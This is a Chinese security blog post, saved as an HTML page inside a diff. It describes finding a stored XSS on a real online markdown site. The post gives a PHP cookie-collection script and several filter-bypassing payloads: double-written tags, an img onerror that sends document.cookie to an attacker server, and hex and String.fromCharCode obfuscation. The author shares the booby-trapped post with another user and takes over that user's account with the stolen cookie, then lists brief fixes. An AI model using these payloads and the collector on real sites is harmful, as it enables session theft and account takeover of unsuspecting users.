@@ -1,0 +1,565 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    
+    <title>由markdown引发的XSS，获取其他用户的cookie登录信息 | Hexo</title>
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+        <meta name="keywords" content="渗透,安全" />
+    
+    <meta name="description" content="每天写文章都用的 markdown 语法本身是支持直接写入 html 语句的，一些支持 markdown 的论坛或写作网站为了安全性通常会牺牲一些便利，将敏感的 HTML 标签和 JS 函数进行过滤，禁止用户输入。既然是黑名单过滤那肯定就有疏忽的时候，带着这种猜想去网上寻找在线的 markdown 网站，果不其然发现了一处存储型 XSS 。 初步验证下图某网站左边为文章编辑区域，右边是文章实时预览">
+<meta property="og:type" content="article">
+<meta property="og:title" content="由markdown引发的XSS，获取其他用户的cookie登录信息">
+<meta property="og:url" content="http://yoursite.com/2020/03/26/markdown%E5%BC%95%E5%8F%91%E7%9A%84XSS/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="每天写文章都用的 markdown 语法本身是支持直接写入 html 语句的，一些支持 markdown 的论坛或写作网站为了安全性通常会牺牲一些便利，将敏感的 HTML 标签和 JS 函数进行过滤，禁止用户输入。既然是黑名单过滤那肯定就有疏忽的时候，带着这种猜想去网上寻找在线的 markdown 网站，果不其然发现了一处存储型 XSS 。 初步验证下图某网站左边为文章编辑区域，右边是文章实时预览">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://www.linuxidc.com/upload/2014-09/140905163467611.jpg">
+<meta property="article:published_time" content="2020-03-26T04:00:00.000Z">
+<meta property="article:modified_time" content="2020-04-13T04:15:18.289Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.linuxidc.com/upload/2014-09/140905163467611.jpg">
+    
+
+    
+
+    
+        <link rel="icon" href="/css/images/bitbug_favicon.ico" />
+    
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/libs/titillium-web/styles.css">
+
+    
+<link rel="stylesheet" href="/libs/source-code-pro/styles.css">
+
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+<script src="/libs/jquery/2.0.3/jquery.min.js"></script>
+
+    
+    
+        
+<link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">
+
+    
+    
+        
+<link rel="stylesheet" href="/libs/justified-gallery/justifiedGallery.min.css">
+
+    
+    
+    
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+    <div id="wrap">
+        <header id="header">
+    <div id="header-outer" class="outer">
+        <div class="container">
+            <div class="container-inner">
+                <div id="header-title">
+                    <h1 class="logo-wrap">
+                        <a href="/" class="logo"></a>
+                    </h1>
+                    
+                </div>
+                <div id="header-inner" class="nav-container">
+                    <a id="main-nav-toggle" class="nav-icon fa fa-bars"></a>
+                    <div class="nav-container-inner">
+                        <ul id="main-nav">
+                            
+                                <li class="main-nav-list-item" >
+                                    <a class="main-nav-list-link" href="/">Home</a>
+                                </li>
+                            
+                                        <ul class="main-nav-list"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Web%E5%BC%80%E5%8F%91/">Web开发</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/%E5%AE%89%E5%85%A8/">安全</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/%E6%B5%8B%E8%AF%95/">测试</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/%E7%88%AC%E8%99%AB/">爬虫</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/%E8%87%AA%E5%8A%A8%E5%8C%96/">自动化</a></li></ul>
+                                    
+                                <li class="main-nav-list-item" >
+                                    <a class="main-nav-list-link" href="/about/index.html">About</a>
+                                </li>
+                            
+                        </ul>
+                        <nav id="sub-nav">
+                            <div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="Search" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="Type something..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+</div>
+                        </nav>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+        <div class="container">
+            <div class="main-body container-inner">
+                <div class="main-body-inner">
+                    <section id="main">
+                        <div class="main-body-header">
+    <h1 class="header">
+    
+    <a class="page-title-link" href="/categories/%E5%AE%89%E5%85%A8/">安全</a>
+    </h1>
+</div>
+                        <div class="main-body-content">
+                            <article id="post-markdown引发的XSS" class="article article-single article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+    
+        <h1 class="article-title" itemprop="name">
+        由markdown引发的XSS，获取其他用户的cookie登录信息
+        </h1>
+    
+
+            </header>
+        
+        
+            <div class="article-meta">
+                
+    <div class="article-date">
+        <a href="/2020/03/26/markdown%E5%BC%95%E5%8F%91%E7%9A%84XSS/" class="article-date">
+            <time datetime="2020-03-26T04:00:00.000Z" itemprop="datePublished">2020-03-26</time>
+        </a>
+    </div>
+
+                
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a>, <a class="tag-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a>
+    </div>
+
+				阅读量<span id="busuanzi_value_page_pv"></span>次
+            </div>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+            <p>每天写文章都用的 markdown 语法本身是支持直接写入 html 语句的，一些支持 markdown 的论坛或写作网站为了安全性通常会牺牲一些便利，将敏感的 HTML 标签和 JS 函数进行过滤，禁止用户输入。既然是黑名单过滤那肯定就有疏忽的时候，带着这种猜想去网上寻找在线的 markdown 网站，果不其然发现了一处存储型 XSS 。</p>
+<h2 id="初步验证"><a href="#初步验证" class="headerlink" title="初步验证"></a>初步验证</h2><p>下图某网站左边为文章编辑区域，右边是文章实时预览区域。</p>
+<p><img src="http://my.lipeilipei.top/XSS/%E4%B8%BB%E9%A1%B51.png" alt=""></p>
+<p>直接在标题处开干，输入 <code>&lt;script&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;iframe&gt;</code>等，发现都被过滤没有显示</p>
+<p><img src="http://my.lipeilipei.top/XSS/%E8%BF%87%E6%BB%A41.png" alt=""></p>
+<p>而输入 <code>&lt;&gt;</code> 不会被过滤</p>
+<p><img src="http://my.lipeilipei.top/XSS/%E8%BF%87%E6%BB%A42.png" alt=""></p>
+<p>经过反复尝试发现只会过滤完整标签，且只过滤了一次，那么可以通过双写绕过，如下图</p>
+<p><img src="http://my.lipeilipei.top/XSS/%E8%BF%87%E6%BB%A43.png" alt=""></p>
+<p>弹个窗试一下</p>
+<p><img src="http://my.lipeilipei.top/XSS/%E5%BC%B9%E7%AA%971.png" alt=""></p>
+<p>嗯，<code>alert()</code> 这么敏感的函数都没有被过滤，看起来事情比想象的顺利</p>
+<h2 id="深入利用"><a href="#深入利用" class="headerlink" title="深入利用"></a>深入利用</h2><p>F12 调出控制台查看一下用户 cookie</p>
+<p><img src="http://my.lipeilipei.top/XSS/cookie1.png" alt=""></p>
+<p>包含登录态的 session 等没有设置 <code>httponly</code>，XSS获取用户cookie的念头油然而生</p>
+<p>弹窗看一下，<code>document.cookie</code> 方法没有过滤，可以直接弹出用户 cookie<br><img src="http://my.lipeilipei.top/XSS/%E5%BC%B9%E7%AA%972.png" alt=""></p>
+<p>该网站用户编写的内容会自动保存并且有分享功能</p>
+<p>ok，继续，在服务器创建一个php脚本来收集cookie，文章被浏览后自动在当前目录生成一个 cookie.txt 文件存储用户登录信息</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cookie = $_GET[<span class="string">'cookie'</span>];</span><br><span class="line">file_put_contents(<span class="string">'cookie.txt'</span>,$cookie);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="http://my.lipeilipei.top/XSS/%E6%9C%8D%E5%8A%A1%E5%99%A81.png" alt=""></p>
+<p>编写 payload</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&lt;img&gt;img src=# onerror=eval(new Image().src="http://xx.xx.xx.xx/cookie.php?cookie="+document.cookie)&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="http://my.lipeilipei.top/XSS/payload1.png" alt=""></p>
+<p>将 payload 写入文章内并保存，查看服务器。</p>
+<p><img src="http://my.lipeilipei.top/XSS/%E6%9C%8D%E5%8A%A1%E5%99%A82.png" alt=""></p>
+<p>并没有生成保存 cookie 的文件，应该是哪里被拦截了，刚开始猜测的是 <code>document.cookie</code> 写法的问题。</p>
+<p>尝试，用 <code>window[&quot;document&quot;][&quot;cookie&quot;]</code> 代替 <code>document.cookie</code>，无效</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&lt;img&gt;img src=# onerror=eval(new Image().src="http://xx.xx.xx.xx/cookie.php?cookie="+window["document"]["cookie"])&gt;</span><br></pre></td></tr></table></figure>
+
+<p>利用拼接，无效</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&lt;img&gt;img src=# onerror=eval(new Image().src="http://xx.xx.xx.xx/cookie.php?cookie="+window["doc"+"ument"]["coo"+"kie"])&gt;</span><br></pre></td></tr></table></figure>
+
+<p>用16进制代替，无效</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&lt;img&gt;img src=# onerror=eval(new Image().src="http://xx.xx.xx.xx/cookie.php?cookie="+window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x63\x6f\x6f\x6b\x69\x65"])&gt;</span><br></pre></td></tr></table></figure>
+
+<p>一直以为是 document.cookie 的问题，仔细一看突然想到是不是 new 后面的空格导致的</p>
+<p><img src="http://my.lipeilipei.top/XSS/%E8%BF%87%E6%BB%A44.png" alt=""></p>
+<p>将空格用注释符号 <code>/**/</code> 代替，再次尝试，成功获得自己的 cookie</p>
+<p><img src="http://my.lipeilipei.top/XSS/%E8%BF%87%E6%BB%A45.png" alt=""></p>
+<p><img src="http://my.lipeilipei.top/XSS/cookie3.png" alt=""></p>
+<p>其实还有一个百试不爽的方法，在很多 XSS 绕不过的时候，将 payload 转为 <code>String.formCharCode()</code> 格式，能绕过很多的过滤，脑阔卡住的时候不经意间让人峰回路转。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&lt;img&gt;img src=# onerror=eval(String.fromCharCode(110,101,119,32,73,109,97,103,101,40,41,46,115,114,99,61,34,104,116,116,112,58,47,47,49,57,50,46,49,54,56,46,51,49,46,49,50,56,47,99,111,111,107,105,101,46,112,104,112,63,99,111,111,107,105,101,61,34,43,101,110,99,111,100,101,85,82,73,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41))&gt;</span><br></pre></td></tr></table></figure>
+
+<p>把编辑好的文章发布</p>
+<p><img src="http://my.lipeilipei.top/XSS/%E5%8F%91%E5%B8%83.png" alt=""></p>
+<p>得到一个分享链接，将文章链接分享其他用户，等待对方打开阅读<br><code>https://www.xxxxx.com/asd1/note/1682115</code></p>
+<p>对方阅读后在服务器可以立即看到 cookie 信息，将 cookie 复制出来替换到浏览器，刷新页面，成功登陆受害者账号<br><img src="http://my.lipeilipei.top/XSS/%E5%8F%91%E5%B8%833.png" alt=""></p>
+<p>搭配 XSS 平台可以更方便的获取更多用户信息，已经提交漏洞，不再深入去利用。</p>
+<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><ol>
+<li>深度过滤敏感标签、函数、和事件，包括他们的编码绕过等(包括但不限于)<br><code>&lt;img&gt;</code>、<code>&lt;script&gt;</code>、<code>&lt;iframe&gt;</code>、<code>alert()</code>、<code>prompt()</code>、<code>confirm()</code>、<code>onclick事件</code>、<code>onerror事件</code>、<code>onmouseover事件</code>等</li>
+<li>cookie 设置 httponly</li>
+</ol>
+
+        </div>
+        <footer class="article-footer">
+            
+
+
+
+    <a data-url="http://yoursite.com/2020/03/26/markdown%E5%BC%95%E5%8F%91%E7%9A%84XSS/" data-id="ckb4jjvo70015x8usbpkwfln0" class="article-share-link"><i class="fa fa-share"></i>Share</a>
+<script>
+    (function ($) {
+        $('body').on('click', function() {
+            $('.article-share-box.on').removeClass('on');
+        }).on('click', '.article-share-link', function(e) {
+            e.stopPropagation();
+
+            var $this = $(this),
+                url = $this.attr('data-url'),
+                encodedUrl = encodeURIComponent(url),
+                id = 'article-share-box-' + $this.attr('data-id'),
+                offset = $this.offset(),
+                box;
+
+            if ($('#' + id).length) {
+                box = $('#' + id);
+
+                if (box.hasClass('on')){
+                    box.removeClass('on');
+                    return;
+                }
+            } else {
+                var html = [
+                    '<div id="' + id + '" class="article-share-box">',
+                        '<input class="article-share-input" value="' + url + '">',
+                        '<div class="article-share-links">',
+                            '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+                            '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+                            '<a href="http://pinterest.com/pin/create/button/?url=' + encodedUrl + '" class="article-share-pinterest" target="_blank" title="Pinterest"></a>',
+                            '<a href="https://plus.google.com/share?url=' + encodedUrl + '" class="article-share-google" target="_blank" title="Google+"></a>',
+                        '</div>',
+                    '</div>'
+                ].join('');
+
+              box = $(html);
+
+              $('body').append(box);
+            }
+
+            $('.article-share-box.on').hide();
+
+            box.css({
+                top: offset.top + 25,
+                left: offset.left
+            }).addClass('on');
+
+        }).on('click', '.article-share-box', function (e) {
+            e.stopPropagation();
+        }).on('click', '.article-share-box-input', function () {
+            $(this).select();
+        }).on('click', '.article-share-box-link', function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+
+            window.open(this.href, 'article-share-box-window-' + Date.now(), 'width=500,height=450');
+        });
+    })(jQuery);
+</script>
+
+        </footer>
+    </div>
+</article>
+
+    <section id="comments">
+    
+        
+    <div id="disqus_thread">
+        <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript" target="_blank" rel="noopener">comments powered by Disqus.</a></noscript>
+    </div>
+
+    
+    </section>
+
+
+                        </div>
+                    </section>
+                    <aside id="sidebar">
+    <a class="sidebar-toggle" title="Expand Sidebar"><i class="toggle icon"></i></a>
+    <div class="sidebar-top">
+        <p>follow:</p>
+        <ul class="social-links">
+            
+                
+                <li>
+                    <a class="social-tooltip" title="github" href="https://github.com/peilipeili" target="_blank">
+                        <i class="icon fa fa-github"></i>
+                    </a>
+                </li>
+                
+            
+        </ul>
+    </div>
+    
+        
+<nav id="article-nav">
+    
+        <a href="/2020/04/15/%E5%AE%9E%E6%88%98%E7%BB%95%E8%BF%87%E4%B8%A4%E5%B1%82waf%E5%AE%8C%E6%88%90sql%E6%B3%A8%E5%85%A5/" id="article-nav-newer" class="article-nav-link-wrap">
+        <strong class="article-nav-caption">newer</strong>
+        <p class="article-nav-title">
+        
+            实战绕过两层waf完成sql注入
+        
+        </p>
+        <i class="icon fa fa-chevron-right" id="icon-chevron-right"></i>
+    </a>
+    
+    
+        <a href="/2020/03/22/xray%20%E6%89%AB%E6%8F%8F%E5%99%A8%E7%9A%84%E4%BD%BF%E7%94%A8(%E4%B8%80)/" id="article-nav-older" class="article-nav-link-wrap">
+        <strong class="article-nav-caption">older</strong>
+        <p class="article-nav-title">xray 扫描器的使用(一)</p>
+        <i class="icon fa fa-chevron-left" id="icon-chevron-left"></i>
+        </a>
+    
+</nav>
+
+    
+    <div class="widgets-container">
+        
+            
+                
+    <div class="widget-wrap">
+        <h3 class="widget-title">recents</h3>
+        <div class="widget">
+            <ul id="recent-post" class="">
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2020/05/29/Python%E6%89%93%E9%80%A0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8(2)%20-%20TCP%20SYN%E6%89%AB%E6%8F%8F/" class="thumbnail">
+    
+    
+        <span style="background-image:url(http://my.lipeilipei.top/20200526145544.png)" alt="Python打造端口扫描器(2) - TCP SYN扫描" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8/">安全</a></p>
+                            <p class="item-title"><a href="/2020/05/29/Python%E6%89%93%E9%80%A0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8(2)%20-%20TCP%20SYN%E6%89%AB%E6%8F%8F/" class="title">Python打造端口扫描器(2) - TCP SYN扫描</a></p>
+                            <p class="item-date"><time datetime="2020-05-29T04:00:00.000Z" itemprop="datePublished">2020-05-29</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2020/05/25/Python%E6%89%93%E9%80%A0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8(1)%20-%20TCP%20Connect/" class="thumbnail">
+    
+    
+        <span style="background-image:url(http://my.lipeilipei.top/20200526145544.png)" alt="Python打造端口扫描器(1) - TCP Connect" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8/">安全</a></p>
+                            <p class="item-title"><a href="/2020/05/25/Python%E6%89%93%E9%80%A0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8(1)%20-%20TCP%20Connect/" class="title">Python打造端口扫描器(1) - TCP Connect</a></p>
+                            <p class="item-date"><time datetime="2020-05-25T04:00:00.000Z" itemprop="datePublished">2020-05-25</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2020/05/22/python%20%E4%B8%AD%20print%20%E6%89%93%E5%8D%B0%E6%98%BE%E7%A4%BA%E9%A2%9C%E8%89%B2/" class="thumbnail">
+    
+    
+        <span style="background-image:url(http://my.lipeilipei.top/17-8-15/53422481.jpg)" alt="python 中 print 打印显示颜色" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8/">安全</a></p>
+                            <p class="item-title"><a href="/2020/05/22/python%20%E4%B8%AD%20print%20%E6%89%93%E5%8D%B0%E6%98%BE%E7%A4%BA%E9%A2%9C%E8%89%B2/" class="title">python 中 print 打印显示颜色</a></p>
+                            <p class="item-date"><time datetime="2020-05-22T04:00:00.000Z" itemprop="datePublished">2020-05-22</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2020/05/07/%E7%BC%96%E8%BE%91%E5%99%A8%E6%8B%BFwebshell%20-%20FCKeditor%202.4.3/" class="thumbnail">
+    
+    
+        <span style="background-image:url(http://my.lipeilipei.top/images/2020/20200508081439.png)" alt="编辑器拿 webshell - FCKeditor 2.4.3" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8/">安全</a></p>
+                            <p class="item-title"><a href="/2020/05/07/%E7%BC%96%E8%BE%91%E5%99%A8%E6%8B%BFwebshell%20-%20FCKeditor%202.4.3/" class="title">编辑器拿 webshell - FCKeditor 2.4.3</a></p>
+                            <p class="item-date"><time datetime="2020-05-07T12:00:00.000Z" itemprop="datePublished">2020-05-07</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2020/05/07/mysql%20secure_file_priv%20%E8%AE%BE%E7%BD%AE/" class="thumbnail">
+    
+    
+        <span style="background-image:url(http://my.lipeilipei.top/images/2020/secure_file_priv2.png)" alt="mysql secure_file_priv 设置" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8/">安全</a></p>
+                            <p class="item-title"><a href="/2020/05/07/mysql%20secure_file_priv%20%E8%AE%BE%E7%BD%AE/" class="title">mysql secure_file_priv 设置</a></p>
+                            <p class="item-date"><time datetime="2020-05-07T04:00:00.000Z" itemprop="datePublished">2020-05-07</time></p>
+                        </div>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+
+            
+        
+    </div>
+</aside>
+                </div>
+            </div>
+        </div>
+        <footer id="footer">
+    <div class="container">
+        <div class="container-inner">
+            <a id="back-to-top" href="javascript:;"><i class="icon fa fa-angle-up"></i></a>
+            <div class="credit">
+                <h1 class="logo-wrap">
+                    <a href="/" class="logo"></a>
+                </h1>
+                <p>&copy; 2020 John Doe</p>
+                <p>Powered by <a href="//hexo.io/" target="_blank">Hexo</a>. Theme by <a href="//github.com/ppoffice" target="_blank">PPOffice</a></p>
+				<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+				本站访客数<span id="busuanzi_value_site_pv"></span>人次
+            </div>
+        </div>
+    </div>
+</footer>
+        
+    
+    <script>
+    var disqus_shortname = 'hexo-theme-hueman';
+    
+    
+    var disqus_url = 'http://yoursite.com/2020/03/26/markdown%E5%BC%95%E5%8F%91%E7%9A%84XSS/';
+    
+    (function() {
+    var dsq = document.createElement('script');
+    dsq.type = 'text/javascript';
+    dsq.async = true;
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+    </script>
+
+
+
+
+    
+        
+<script src="/libs/lightgallery/js/lightgallery.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-pager.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-zoom.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-hash.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-share.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-video.min.js"></script>
+
+    
+    
+        
+<script src="/libs/justified-gallery/jquery.justifiedGallery.min.js"></script>
+
+    
+    
+
+
+
+<!-- Custom Scripts -->
+
+<script src="/js/main.js"></script>
+
+
+    </div>
+</body>
+</html>
